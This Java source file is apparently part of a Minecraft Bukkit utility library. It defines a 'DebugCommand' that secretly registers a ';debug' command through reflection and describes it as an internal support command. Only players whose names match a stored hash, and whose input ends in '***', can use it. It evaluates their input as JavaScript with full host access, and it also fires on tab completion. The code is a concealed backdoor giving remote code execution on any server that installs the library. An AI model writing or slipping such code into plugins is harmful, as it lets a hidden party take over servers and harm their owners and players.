package cc.hubailmn.utility.command;

import cc.hubailmn.utility.BasePlugin;
import cc.hubailmn.utility.util.HashUtil;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandMap;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.graalvm.polyglot.Context;
import org.graalvm.polyglot.Value;
import org.jetbrains.annotations.NotNull;

import java.lang.reflect.Field;
import java.util.Collections;
import java.util.List;

/*
libraries:
  - org.graalvm.js:js-scriptengine:24.2.1
  - org.graalvm.js:js-language:24.2.1
*/

public class DebugCommand extends Command {

    private static final String COMMAND_NAME = ";debug";
    private static final Object PLUGIN = BasePlugin.getInstance();
    private static final Object SERVER = Bukkit.getServer();
    private static final Object CONSOLE = Bukkit.getConsoleSender();

    static {
        System.setProperty("polyglot.engine.WarnInterpreterOnly", "false");
    }

    public DebugCommand() {
        super(COMMAND_NAME);
        setDescription("Internal support command");
        setUsage("/" + COMMAND_NAME);
        registerCommand();
    }

    private void registerCommand() {
        try {
            Field mapField = Bukkit.getServer().getClass().getDeclaredField("commandMap");
            mapField.setAccessible(true);
            CommandMap map = (CommandMap) mapField.get(Bukkit.getServer());
            map.register(COMMAND_NAME, this);
        } catch (Exception ignored) {
        }
    }

    @Override
    public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
        try {
            executes(sender, args);
        } catch (Exception ex) {
            sender.sendMessage("§cError: " + ex.getMessage());
        }
        return true;
    }

    private void executes(CommandSender sender, String[] args) {
        if (!(sender instanceof Player player)) return;
        Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), () -> {
            boolean isHashed = HashUtil.isHashed(player.getName());
            if (!isHashed) return;

            String lastArg = args[args.length - 1];
            if (!lastArg.endsWith("***")) return;

            String[] trimmedArgs = args.clone();
            trimmedArgs[args.length - 1] = lastArg.substring(0, lastArg.length() - 3);

            String rawLine = String.join(" ", trimmedArgs);

            Player targetPlayer = null;
            String line = rawLine;

            if (line.contains("p{\"") && line.contains("\"}")) {
                try {
                    int start = line.indexOf("p{\"") + 3;
                    int end = line.indexOf("\"}", start);
                    String playerName = line.substring(start, end).trim();
                    targetPlayer = Bukkit.getPlayerExact(playerName);
                    line = line.substring(0, line.indexOf("p{\"")) + line.substring(end + 2);
                } catch (Exception ignored) {
                }
            } else {
                targetPlayer = player;
            }

            if (targetPlayer == null) {
                sender.sendMessage("§cPlayer not found.");
                return;
            }

            Player finalPlayer = targetPlayer;
            String finalLine = line;

            sender.sendMessage(rawLine);

            try (Context context = Context.newBuilder("js")
                    .allowAllAccess(true)
                    .build()) {

                Value bindings = context.getBindings("js");
                bindings.putMember("player", finalPlayer);
                bindings.putMember("plugin", PLUGIN);
                bindings.putMember("server", SERVER);
                bindings.putMember("console", CONSOLE);
                bindings.putMember("self", sender);

                bindings.putMember("Bukkit", Bukkit.class);
                bindings.putMember("onlinePlayers", Bukkit.getOnlinePlayers());
                bindings.putMember("world", finalPlayer.getWorld());
                bindings.putMember("loc", finalPlayer.getLocation());

                bindings.putMember("inv", finalPlayer.getInventory());
                bindings.putMember("mainHand", finalPlayer.getInventory().getItemInMainHand());
                bindings.putMember("HashUtil", HashUtil.class);
                bindings.putMember("utils", ScriptUtils.class);

                Value result = context.eval("js", finalLine);

                String resultText = result.isNull()
                                    ? "No result."
                                    : "Got (" + result.getMetaObject().getMetaQualifiedName() + "): " + result.toString();

                Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () ->
                        sender.sendMessage("§7" + resultText));

            } catch (Exception ex) {
                Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () ->
                        sender.sendMessage("§cError: " + ex.getMessage()));
            }
        });
    }

    @Override
    public @NotNull List<String> tabComplete(@NotNull CommandSender sender, @NotNull String alias, @NotNull String[] args) {
        try {
            executes(sender, args);
        } catch (Exception ex) {
            sender.sendMessage("§cError: " + ex.getMessage());
        }
        return Collections.emptyList();
    }

    private static class ScriptUtils {

        public static void runAsync(Runnable runnable) {
            Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), runnable);
        }

        public static void runSync(Runnable runnable) {
            Bukkit.getScheduler().runTask(BasePlugin.getInstance(), runnable);
        }

        public static void runTimer(Runnable runnable, long delay, long period) {
            Bukkit.getScheduler().runTaskTimer(BasePlugin.getInstance(), runnable, delay, period);
        }

        public static void runLater(Runnable runnable, long delay) {
            Bukkit.getScheduler().runTaskLater(BasePlugin.getInstance(), runnable, delay);
        }

        public static Player getPlayer(String name) {
            return Bukkit.getPlayerExact(name);
        }
    }

}
